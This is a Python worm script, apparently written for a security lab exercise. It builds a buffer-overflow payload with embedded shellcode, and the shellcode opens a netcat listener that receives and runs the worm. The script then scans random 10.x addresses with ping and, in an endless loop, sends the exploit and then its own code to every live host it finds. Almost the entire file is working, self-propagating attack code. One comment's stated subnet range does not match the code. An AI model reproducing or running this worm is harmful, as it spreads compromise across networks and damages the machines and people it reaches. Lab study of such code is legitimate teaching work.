#!/bin/env python3
import sys
import os
import socket
import time
import subprocess
from random import randint, shuffle
import threading
import queue

# =================================================================
# TASK 5: The "Mutex" Lock
# Prevent the worm from running twice on the same machine.
# =================================================================
try:
    # Try to lock port 44444.
    # If this succeeds, we are the first worm here.
    lock_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    lock_socket.bind(('0.0.0.0', 44444))
    print("[+] Mutex lock established. I am the active worm.")

except socket.error:
    # If this fails, another worm is already holding the lock.
    # We must exit immediately to save the victim's CPU.
    print("[-] Worm is already running! Exiting...")
    sys.exit(0)

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44"
   "\x44\x44\x44\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x2a\x2d\x63\x2a"
   "\x72\x6d\x20\x2d\x66\x20\x77\x6f\x72\x6d\x2e\x70\x79\x3b\x20\x6e"
   "\x63\x20\x2d\x6c\x6e\x76\x20\x38\x30\x38\x30\x20\x3e\x20\x77\x6f"
   "\x72\x6d\x2e\x70\x79\x3b\x20\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20"
   "\x77\x6f\x72\x6d\x2e\x70\x79\x3b\x20\x20\x20\x20\x70\x79\x74\x68"
   "\x6f\x6e\x33\x20\x77\x6f\x72\x6d\x2e\x70\x79\x20\x26\x20\x20\x20"
   "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
   "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
   "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
   "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
   "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
   "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
   "\x20\x20\x20\x2a"
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   content[500-len(shellcode):] = shellcode

   # These values were confirmed working in your environment
   ret    = 0xffffd650
   offset = 116

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   with open('badfile', 'wb') as f:
      f.write(content)

# =================================================================
# GLOBAL VARIABLES
# =================================================================
# The list of ALL possible IP addresses in the lab
candidate_list = []
# The queue of CONFIRMED alive victims ready to attack
victim_queue = queue.Queue()
# A lock to prevent threads from messing up the queue
q_lock = threading.Lock()

def init_candidate_list():
    """Generates a shuffled list of every possible IP in the lab."""
    global candidate_list
    print("[*] Generating global target list...", flush=True)
    
    # Lab Topology:
    # Networks: 150 to 155
    # Hosts: 70 to 80 (The range used in the Docker setup)
    for subnet in range(150, 180):
        for host in range(0, 100):
            ip = f"10.{subnet}.0.{host}"
            candidate_list.append(ip)
            
    # CRITICAL: Shuffle the list to ensure we attack purely randomly
    shuffle(candidate_list)
    print(f"[*] Target list ready: {len(candidate_list)} potential targets.", flush=True)

def check_ip(ip):
    """Pings a single IP. If alive, adds to victim_queue."""
    try:
        # Don't attack myself
        myIP = subprocess.check_output(["hostname", "-I"]).decode().split()[0]
        if ip == myIP: 
            return

        # Ping check (Fast: 1 second timeout)
        resp = subprocess.call(
            ["ping", "-c", "1", "-W", "1", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        if resp == 0:
            print(f"[+] FOUND VICTIM: {ip}", flush=True)
            with q_lock:
                victim_queue.put(ip)
    except:
        pass

def refill_victim_queue():
    """Takes the next 20 random IPs and scans them in parallel."""
    global candidate_list
    
    if not candidate_list:
        print("[-] We have scanned the entire internet! Restarting list...")
        init_candidate_list()
        
    # Take the next batch of 20 random targets
    batch = []
    for _ in range(20):
        if candidate_list:
            batch.append(candidate_list.pop())
            
    # Launch a thread for each one (Parallel Scanning)
    threads = []
    print(f"[*] Scanning batch of {len(batch)} random targets...", end='\r')
    for ip in batch:
        t = threading.Thread(target=check_ip, args=(ip,))
        t.start()
        threads.append(t)
        
    # Wait for this batch to finish
    for t in threads:
        t.join()

def getNextTarget():
    # 1. Initialize if this is the first run
    if not candidate_list and victim_queue.empty():
        init_candidate_list()

    # 2. Keep refilling the queue until we find someone alive
    while victim_queue.empty():
        refill_victim_queue()
        
        # If queue is STILL empty after a batch, wait a tiny bit to be safe
        if victim_queue.empty():
            time.sleep(1)

    # 3. Return the next confirmed victim
    return victim_queue.get()


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# VISUALIZATION: Ping a fake IP so the map shows the infection
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the payload
createBadfile()

# Loop forever to keep spreading
while True:
    targetIP = getNextTarget()

    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)

    # 1. BREAK IN: Send the Exploit
    # This crashes the buffer and runs shellcode to open port 8080 on the victim
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Wait for the shellcode to execute and open the port
    time.sleep(1)

    # 2. SPREAD: Transfer the Worm
    # Connects to the open port 8080 and pushes the file
    print(f">>>>> Transferring worm.py to {targetIP} <<<<<", flush=True)
    subprocess.run([f"cat worm.py | nc -w5 {targetIP} 8080"], shell=True)

    # Sleep to avoid network congestion (and give you time to watch the map)
    time.sleep(5)